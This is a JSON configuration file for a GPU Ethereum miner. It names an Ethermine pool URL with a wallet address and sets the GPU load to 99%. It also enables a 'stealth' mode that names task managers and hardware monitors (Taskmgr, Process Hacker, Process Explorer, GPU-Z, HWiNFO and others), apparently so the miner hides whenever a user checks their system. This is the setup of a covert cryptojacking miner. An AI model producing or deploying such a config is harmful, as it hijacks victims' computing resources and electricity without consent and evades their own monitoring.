{
    "url": "stratum://0xE8dB001f70ccA66944034faF7F30AeC4B3b422DA.deenud@eu1.ethermine.org:4444",
    "algo": "ethash",
    "max-gpu": 99,
    "stealth": true,
    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,HWiNFO64.exe,HWiNFO32.exe,MSIAfterburner.exe,GPU-Z.exe,GPU-Z.2.41.0.exe"
}